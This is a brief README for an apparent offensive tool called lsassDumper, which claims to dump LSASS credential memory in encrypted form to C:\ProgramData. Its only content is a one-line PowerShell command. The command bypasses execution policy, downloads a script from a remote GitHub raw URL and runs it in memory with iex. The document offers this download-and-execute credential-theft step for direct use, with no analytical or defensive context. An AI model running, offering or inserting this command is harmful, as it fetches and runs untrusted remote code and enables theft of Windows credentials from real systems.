# lsassDumper

This project provide the necessary payloads to perform an encrypted dump of LSASS in C:\ProgramData

Execute :

`powershell -ep bypass -c "iex(iwr -useb https://raw.githubusercontent.com/666reda/lsassDumper/main/inj.txt) ; start-sleep 44"`
